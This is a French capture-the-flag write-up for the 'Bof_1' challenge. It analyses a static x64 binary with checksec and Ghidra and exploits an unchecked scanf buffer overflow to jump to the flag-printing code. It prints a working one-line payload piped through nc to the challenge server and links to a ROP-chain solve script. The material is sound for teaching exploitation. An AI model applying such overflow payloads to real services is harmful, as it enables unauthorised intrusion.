# Bof_1

## Analyse

Ce challenge nous offre un binaire nommé `service`, d'après son titre, je sais que je vais devoir exploiter un buffer overflow.
Je commence par analyser le fichier

```js
aether@ysera:~/Documents/ctf/cyberthreatforce/pwn/Bof_1 $ checksec ./service
[*] '/home/aether/Documents/ctf/cyberthreatforce/pwn/Bof_1/service'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
aether@ysera:~/Documents/ctf/cyberthreatforce/pwn/Bof_1 $ file ./service            
./service: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, BuildID[sha1]=235b90b9a6b2b68413c7825c0c236da020a0bd10, for GNU/Linux 4.4.0, not stripped
```

Avec ces commandes, je sais que les adresses dans le binaires seront toujours les mêmes grâce au `No PIE`. De plus, je sais que le binaire est un `x64` compilé en statique.

Un rapide coup de `strings` montre aussi que le flag est potentiellement déjà dans le binaire.

```js
aether@ysera:~/Documents/ctf/cyberthreatforce/pwn/Bof_1 $ strings ./service | grep CYBERTF
CYBERTF{H
CYBERTF{YZY}
CYBERTF{_____________________}
```

## Récupération du flag

Depuis Ghidra, on apprend que le flag est affiché par la fonction `magie` après une condition.

```c
void magie(int param_1)
{
  int iVar1;
  undefined8 local_15;
  undefined4 local_d;
  undefined local_9;
  
  local_15 = 0x7b46545245425943;
  local_d = 0x7d595a59;
  local_9 = 0;
  if ((param_1 != -1) && (iVar1 = thunk_FUN_004010e6("CYBERTF{YZY}",&local_15), iVar1 != 0)) {
    puts("CYBERTF{_____________________}");
    return;
  }
  puts("Good Way");
  return;
}
```

Etant donné que le flag est directement affiché via la commande `puts`, il suffit de jump sur l'adresse initilisant les registres pour faire afficher le flag.

```js
                             LAB_004018da                                    XREF[1]:     004018c7(j)  
        /* JUMP ICI */
        004018da 48 8d 05        LEA        RAX,[s_CYBERTF{_____________________}_0049f020]  = "CYBERTF{_____________________}"
                 3f d7 09 00
        004018e1 48 89 c7        MOV        RDI=>s_CYBERTF{_____________________}_0049f020   = "CYBERTF{_____________________}"
        004018e4 e8 07 67        CALL       puts                                             int puts(char * __s)
                 01 00
        004018e9 90              NOP

```

D'après Ghidra l'adresse serait `0x004018da`.

Toujours depuis Ghidra, je récupère le nom de la fonction qui va me permettre de faire un overflow ainsi que son index pour dépasser le tampon.

```js
undefined8 main(void)
{
  undefined8 local_38;
  undefined8 local_30;
  undefined8 local_28;
  undefined8 local_20;
  undefined8 local_18;
  
  ignorMe();
  local_38 = 0;
  local_30 = 0;
  local_28 = 0;
  local_20 = 0;
  local_18 = 0;
  puts("hello who are you?");
  __isoc99_scanf(&DAT_0049f052,&local_38);
  printf("Hello %s\n",&local_38);
  return 0;
}
```

La variable est `local_38` dans la fonction `__isoc99_scanf` qui ne vérifie pas la longueur qui lui est envoyé.

```js
undefined8        Stack[-0x38]:8 local_38                                XREF[3]:     00401935(W)
```

Il ne me reste plus qu'à overflow avec `0x38` caractère puis de mettre l'adresse sur laquelle je veux tomber pour récupérer le flag.

```js
aether@ysera:~/Documents/ctf/cyberthreatforce/pwn/Bof_1 $ python -c "print('A' * 0x38 + '\xda\x18\x40')" | nc 144.217.73.235 21556
hello who are you?
Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�@
CYBERTF{B@sic_Buff3r_Ov3rflow}
```

## Exploitation via ROPchain

Merci à @0xSoEasy, le script est disponible ici: <https://github.com/AetherBlack/CyberThreatForce2021/blob/main/Pwn/Bof_1/solve_ROPchain.py>.

## Flag

flag: `CYBERTF{B@sic_Buff3r_Ov3rflow}`
